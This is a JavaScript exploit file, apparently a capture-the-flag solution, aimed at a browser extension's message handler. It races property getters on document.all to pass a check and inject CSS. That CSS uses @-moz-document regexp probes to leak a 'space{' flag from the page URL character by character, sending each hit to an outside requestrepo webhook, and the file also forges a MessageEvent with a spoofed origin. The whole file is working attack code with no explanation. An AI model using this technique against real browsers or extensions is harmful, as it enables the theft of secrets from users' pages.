// exploit.js

const WEBHOOK = "https://brle6wul.requestrepo.com";
const BASE_URL = "http://127.0.0.1/?flag=";
const ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789_{}?";

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
const escapeForRegex = (s) => s.replace(/[/.?{}]/g, ".");

let knownFlag = "space{";
function buildEvilCss(nChars) {
  const totalProbes = nChars * ALPHABET.length;
  const collector = `:root { background-image: ${Array.from({ length: totalProbes }, (_, i) => `var(--p${i}, none)`).join(", ")} !important; }`;
  const blocks = [collector];
  let probeN = 0;
  for (let pos = 0; pos < nChars; pos++) {
    for (const char of ALPHABET) {
      const probePattern = escapeForRegex(BASE_URL + knownFlag + ".".repeat(pos) + char + ".*");
      blocks.push(
        `@-moz-document regexp("${probePattern}") {`,
        `  :root {`,
        `    --p${probeN}: url("${WEBHOOK}/leaked/${probePattern}");`,
        `  }`,
        `}`
      );
      probeN++;
    }
  }
  return blocks.join("\n");
}

function cleanDocumentAllObject() {
  while (document.firstChild) {
    document.removeChild(document.firstChild);
  }
}
cleanDocumentAllObject();

const evilCss = buildEvilCss(64);
const safeCss = `* {color: red !important; }`;

var nCalls = { "css": 0, "origin": 0 };
Object.defineProperty(document.all, 'css', {
  configurable: true,
  enumerable: true,
  get() {
    nCalls.css++;
    return nCalls.css % 2 === 0 ? safeCss : evilCss;
  }
});

Object.defineProperty(document.all, 'origin', {
  configurable: true,
  enumerable: true,
  get: function () {
    nCalls.origin++;
    return nCalls.origin % 2 === 0 ? "AUTHOR" : "USER";
  }
});

Object.defineProperty(document.all, 'target', {
  configurable: true,
  enumerable: true,
  get: function () {
    return { tabId: 1 };
  }
});


(async () => {
  await sleep(1_000);
  var fakeMessageEvent = new MessageEvent(
    "message",
    {
      origin: window.origin,
      data: document.all
    }
  );
  window.dispatchEvent(fakeMessageEvent);
  console.log("[PAGE] dispatched fake message event");
})();